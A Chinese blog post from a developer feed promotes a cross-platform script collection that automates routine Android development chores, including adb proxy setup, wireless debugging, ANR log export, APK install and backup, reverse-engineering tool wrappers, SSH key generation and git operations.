                  <span class="hljs-attribute">color</span>: Colors.black,
                  <span class="hljs-attribute">fontWeight</span>: FontWeight.bold
              )
          ),
        ),
      ),
    ],
  ),
)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[都 2026 了，还有人在手敲命令行？]]></title>    <link>https://juejin.cn/post/7602411521070825491</link>    <guid>https://juejin.cn/post/7602411521070825491</guid>    <pubDate>2026-02-03T07:38:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602411521070825491" data-draft-id="7602191709389291562" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="都 2026 了，还有人在手敲命令行？"/> <meta itemprop="keywords" content="Android,敏捷开发,命令行"/> <meta itemprop="datePublished" content="2026-02-03T07:38:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Android轮子哥"/> <meta itemprop="url" content="https://juejin.cn/user/712139265815144"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            都 2026 了，还有人在手敲命令行？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139265815144/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Android轮子哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T07:38:43.000Z" title="Tue Feb 03 2026 07:38:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><ul>
<li>
<p>程序员圈有一道两极分化的风景，有的人喜欢敲命令行，喜欢制造一种高大上的感觉，有的人却讨厌敲命令行，讨厌记那些又臭又长的命令。</p>
</li>
<li>
<p>没错，我就是非常讨厌敲命令行的那类人，每次敲命令我都得去翻笔记，复制命令，改参数，再去终端执行命令，这套流程下来不仅浪费时间和精力，还非常消耗心力。</p>
</li>
<li>
<p>我时常在想，要是有好用的工具可以替代我敲命令行就好了，我找了一圈，发现没有人做这件事，我后面思考了一个问题，为什么没有人愿意做呢？现在我终于想通了，因为做一个工具出来所消耗的时间是敲一次命令的数百倍乃至千倍的成本，如果要想把工具做好，这个成本还要再翻十几倍，这明显是一件破事，但又是我们在开发中不得不面对琐事，终于有一天，我受不了，挺身而出，花了半年的时间搞定了这件事，在这个过程我不仅是程序员，还是产品经理，也是用户，我知道大家想要什么，为此我不得不精心打磨每一个细节，一个功能要改了无数行代码，调试数百次。终于在今天，这个产品终于跟大家见面了，这次我将彻底终结大家手敲命令行的烦恼。</p>
</li>
</ul>
<h4 data-id="heading-0">项目亮点</h4>
<ul>
<li>
<p>支持多平台：macOs、Windows、Linux</p>
</li>
<li>
<p>支持多任务执行：批量安装、批量卸载、批量签名、批量授权等</p>
</li>
<li>
<p>支持多设备并行：可指定设备执行任务，也可全部设备执行任务</p>
</li>
<li>
<p>功能非常简单：不需要记命令行，更不需要敲命令行，点击脚本（Windows 提供 bat 脚本，macOs 提供 command 脚本，Linux 提供 sh 脚本）即可运行，输入参数即可完成你想要的任务。</p>
</li>
<li>
<p>功能非常全面：涵盖设备交互、逆向工具、Git 版本管理、包体工具，几乎涵盖 Android 开发的方方面面，你能想到的我都想到了，没有想到的我也帮你想到了</p>
</li>
</ul>
<h4 data-id="heading-1">解决痛点</h4>
<ul>
<li>解决手机 Http 代理麻烦的问题：平时开发中遇到需要调试接口的，肯定需要给手机连一个代理，我们都需要在手机 WIFI 设置中添加代理，常规的步骤有，需要先获取电脑的 IP 地址，然后在手机上面填 IP 地址和端口，这些都是重复劳动，虽然工作量不多，但是毫无意义，并且次数一多就会感觉心累，那个时候我在想，有没有一个东西，能够帮我自动获取电脑的 IP 地址，然后自动给手机设置一下代理呢？现在这个想法总算是实现了，我现在通过脚本解决了这个问题，一键就能完成自动连接代理和清除代理。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5914dc381004964a4b7f2e8bbf50bf6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=3tWL1zDo9fdDo0BlgelBNclfnfs%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7bef086a548d40e79c50190a634c3d90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=9OU6kLklqH5iU%2BiDT7WfGbUGsDI%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决手机和电脑文本传输问题：adb 有一个输入文本（adb input）的命令，这个命令无法输入带中文的文本，也无法输入多行文本，这个问题就导致大家用别人封装的 adb 这类工具的时候，也会存在这个问题，导致大部分人想要传输文本，只能先在测试机登录 QQ 或者微信小号，然后通过大号发送消息来传输文本，但是现在我通过脚本彻底解决了这两个问题，目前已支持输入带中文字符和换行符的文本，大家放心大胆用它发送各种各样的文本到手机上，无需登录社交账号。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/126265d51a994b51b2909ac59b5f9663~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=StbX6WPAVgp8QZpWS3NwMt6vYWQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6b61b300234d44e1add0742d5daa67f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=cF3bahkQ3vWRSUrFZ3vf9pZdUw4%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决用测试机打开网页问题：在开发中，你如果想要用测试机打开指定的网页，必须先解决文本传输的问题，这个问题前面讲过了，还要在手机找到浏览器，输入 URL 再打开，这一套流程下 10 分钟没有了，有没有 10 秒钟能搞定的事情，有的，《跳转到指定的 URL》脚本解君愁，只需要输入网页 URL，按下回车键就会帮你在手机上面打开指定的网页，不仅支持 Http 和 Https 网页，只要是符合 Scheme 协议它都支持，还支持多设备同时打开。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1dbfe8935e9d48a286144372c1955ae6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=Ac5W%2B%2BwdFMkh4qFBuneZEY1%2B5h0%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7221594a816648bb81651f754c68b5b7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=pKutwxQNTJaNb34zaEXGAcucRZo%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决代码写死 Activity 跳转的问题：在开发中，你如果想要跳转到已经开发完上线的特定页面，对于开发者而言，最简单的方法就是在代码写死 startActivity 进行测试，但是这种方法非常低效，一方面你需要写跳转的代码，填跳转的参数，还要运行 Android Studio（编译耗时）才能看到效果，现在不需要了，《跳转到指定的 Activity》脚本解君愁，只需要输入要跳转的 Activity 包名和类名，和跳转参数即可跳转，无需运行 Android Studio 执行编译这种耗时操作。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/88802d798d144f349f03c6dcf87fc209~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=am5bxd5uX4%2FkmlopQcmjvtPVSWs%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7ec9d4f93e04a56b69cb1c4f9c699cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=n7oe0VvYsIOiNg9c1BHbczI7yto%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决日常各种跳转页面的问题：在开发中，我们常常要打开某些常用页面，例如：开发者选项，关于手机、跳转到微信这几个操作是最常用，以前需要用眼睛找和用手点，现在不需要了，项目提供《跳转到开发者选项》、《跳转到关于本机》、《跳转到微信主界面》的脚本，点一下鼠标即可跳转。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c632aeebb1094bbbaf403acc3e0118cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=%2BXeuoAQVcON4n52v8wihP0evKsY%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/da643e427942421a86035c7e5b2bdd5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=vOOF%2BfEpPu4%2FDck7iGO%2FqzkNzos%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决 adb 无线调试麻烦的问题：虽然 adb 一直都是支持无线连接，但是我相信大部分都没有去用，究其原因是用电脑以无线的方式连接手机太麻烦，还不如用数据线来连接，但是用数据线也有一定的弊端：我们在工作中可能需要拿测试机去到别的同事工位的情况下，这个时候就必须断开有线连接，回来又得用数据线重新连接上，又或者自己只有一条数据线，但是现在需要同时调试多部手机的情况，就需要频繁拔插数据线，这个时候无线连接就能弥补这些短板，但是无线连接又太麻烦，不仅得敲 <code>adb tcp 5555</code> 开启无线端口，还要敲 <code>adb connect 192.168.1.123:5555</code> 才能连接设备，结束了还要敲 <code>adb disconnect 192.168.1.123:5555</code> 才能断开设备，这套流程整下来极其麻烦，都不想用无线 adb 了，我知道大家的苦，我也知道大家的痛，基于这套流程我封装了《开启无线调试》和《断开无线调试》脚本，你将无需关心命令怎么敲，流程怎么处理，只需要按照脚本的提示操作进行就可以了，一键就能完成开启和断开无线 adb 调试，全程无痛。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/056c20243706487abcf436e0a3cd6895~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=NKQYQc4u0JcTknxDs03T4Vw5YGM%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60498f5acec549269c1f7b19a6d1f6bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=6TysJyZerWaLlwN%2Fvrt%2FpGjoAQI%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决用 adb 命令导出 anr 文件麻烦的问题：在开发中，如果我们想要查看 anr 日志，则需要通过 adb 命令导出，这个时候会有一个问题，Android 导出 anr 日志的 adb 命令需要根据 Android 版本适配，Android 7.0 以下用 <code>adb pull /data/anr/traces.txt</code>，Android 7.0 及以上用 <code>adb bugreport xxx.zip</code>，高版本导出成功还不能直接用，还要找到压缩包中的 <code>FS/data/anr/anr_xxx</code> 文件并解压，解压完还要重命名成 txt 结尾才能打开，兜兜转转才能看到 ANR 日志，而现在你无需进行这些繁琐操作，只要一点我封装的《导出 ANR 日志》脚本，即可一键完成导出，过程就一个字：爽。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2d36cee46d56408cb5ff07672ee3beac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=Wu7brgDSV7RHDhhl5EEN06qUtww%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c5c204bc49344e8946b77c312f3154f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=tSq9%2BZ3FuSz88l2Q%2FjQqnCDI1WQ%3D" alt="" loading="lazy"/></p>
<ul>
<li>支持一键批量安装应用：这个其实就是我写的安装应用 apk 包体的脚本，你不仅可以指定单个 apk 来安装，还可以指定某个文件夹来安装，这个时候脚本会自动扫描和获取整个目录下的 apk 文件，然后逐个进行安装，并且还可以支持多设备并行该操作，以前需要手敲命令行把手敲断的任务，现在不需要了，点几下鼠标，按几下回车键就可以了。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f1938afa4a644ebb145c9b283913268~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=nnBlereg06udmtmSN6RVKuoI6xw%3D" alt="" loading="lazy"/></p>
<ul>
<li>支持一键备份手机应用：这个其实就是我写的导出应用 apk 包体的脚本，当你不指定要导出包名的时候，这个时候脚本就会获取手机已安装应用的 apk 包体，然后就能批量导出应用的 apk 包体到电脑上面，对于想要备份手机上面的 app 应用的人非常有用。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5f149759a4f4a9da5fc98532b941683~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=9Z6Gj7NPRopN7oicstAcyRLPbTo%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决看手机参数难的问题：怎么知道当前 Activity 组件的包名和类名是什么？怎么知道当前 Activity 上面的 Fragment 类名？怎么知道这台手机 1dp 等于多少 px？怎么知道这台手机的屏幕的分辨率？怎么知道这台手机读取的资源是用的 xxdpi 还是 xxxdpi？怎么知道这台手机的 CPU 架构是 x86 还是 arm？怎么知道这台手机是不是有 BL 锁（设备锁）？这些项目都有提供对应的脚本，一键运行脚本即可完成，去除繁琐的操作。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96255e1ddcde4a36beb0ac599a6b9675~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=L3BuJEylDpjMzBc0cJ14GokxMBI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5e5790711604b8fb954548ebf800aa7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=xsUAflfsFHj4KJqycQlGvM1W%2Fsw%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/334d050e2b97474abccf178cc7a929aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=Pia1tG90diHGbGaKUFM9sTtGPqw%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决 Android 逆向难的问题：项目提供了整套逆向工具，并且针对这些工具进行了脚本化封装，大大降低 Android 逆向入门的门槛，从此搞 Android 逆向不再痛苦，本项目涵盖 jadx、jd-gui、apktool、baksmali、smali、dex2jar 工具的脚本封装，后面使用这些工具的时候无需查阅资料，点开脚本就能实现你的逆向需求。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c4b3038e8054b5a94b0dbbded88b894~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=DjAKllERX7%2FkVSLW2TNoAD127vs%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/08f348bb9a0343d7a7d2cf9fe9bf8e94~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=lcmsg7RP29WzSrnyzmfwSHFX4zY%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决管理 SSH Key 头疼的问题：大家一换到新公司，肯定在新电脑上面安装各种软件和配置，但是我相信大部分人最讨厌的肯定就是配置 SSH Key 了，因为配这个东西实在太麻烦了，敲完 <code>ssh-keygen -t rsa -C xxx@qq.com</code> 生成 SSH Key 后，还得跑去 <code>C:\Users\XXX\.ssh</code> 目录下找到 SSH 的公钥文件，以文本的形式打开并复制公钥密钥，你是不是觉得这样的操作很麻烦，为什么不在生成 SSH Key 时候将公钥密钥打印出来，这样不就能直接复制？我一直有这么一个困惑，但是咱们也不知道人家设计的时候怎么想，硬让我们去对应的目录找对应的文件，然后再去复制文件的内容。但是我正式通知大家，以后再也不用这么做了，那样做简直就是在浪费时间，浪费生命，我封装了一个《创建新的 SSH 密钥》脚本，你只需要在脚本中填入参数就能生成 SSH Key，生成完后还会问你要不要复制？压根就不需要你去手动复制。另外还提供了《查看已有 SSH 公钥》、《删除已有 SSH 密钥》、《打开 SSH 秘钥文件所在的目录》这几个脚本，助力你轻松完成管理 SSH Key 的需求。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f6b4443bb264750990fb5a2d8b8f750~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=RwHoD8IYzCZbR5c1VTbJ3DZR1UI%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f493116fc2b84f96ac1ea5b88e09e810~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=Tim0XmmxB283dSr0HeGgATUMsIc%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决用 Git 拉取项目老失败的问题：你是不是经常遇到拉取 Github 项目时常失败，需要手动重试好几遍的情况才可能拉取成功，整得人心态崩溃，那么恭喜你，遇到了跟我一样的情况，于是我一怒之下，写了一个 Git 项目拉取脚本，如果这是一个普普通通的脚本或者工具，那可能对于你来讲没有什么用，但是你要知道这是我开发的，我会考虑得非常全面，加上了重试机制，失败了就重试，默认重试 10 次，不够再加，再不够再加，直到拉取成功为止，再也不需要自己在拉取项目失败的自己手动操作一遍了。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a3009c76fdb54b2c82ab21984e0fc30e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=T8%2BPtoW5vaxAK8tKC0OReayJ3QI%3D" alt="" loading="lazy"/></p>
<ul>
<li>解决用 Git 版本回退担惊受怕的问题：你是不是也曾遇到过代码需要回退的情况？但是代码回滚涉及到的知识点非常多，你不仅要知道工作区、暂存区、版本库是什么，还要搞清楚 <code>git reset</code> 命令中的 <code>soft</code>、<code>mixed</code>、<code>hard</code> 这三个参数的含义作用区别，到这里你是不是瞬间感觉头都大了？又得重温一下以前的知识点，动手操作的时候还要乞求不要出现手抖的情况，否则一旦改动不符合预期，想要恢复回来就很麻烦。针对这两个问题，我封装了《回退到指定的提交上》脚本，你只需要根据脚本的提示进行操作就行，改完后脚本会询问你改动完成后是否预期？如果选择不是，则会帮你还原到最初的状态（就当做无事发生过），如果你选择是，则会帮你完成修改，并创建一个备份的分支，当然创建备份分支的目的是：假设后面你又又后悔了，还可以通过备份的分支再进行恢复，不至于事后拍断大腿。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbd3a44f54e34122bf1a6d9ca3bad8df~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=LbRlk66qHxD7JpGensOEDtLIS9g%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/885e04010cfa47dead95f77478b0aa17~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=2igUW%2FTC57zh7obt1Kkr%2BYKveec%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3952f93e5adc49609955ca669f980251~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQW5kcm9pZOi9ruWtkOWTpQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770709123&amp;x-signature=kebbCe2IOG5KBKKDKJ8tND5Yvb0%3D" alt="" loading="lazy"/></p>
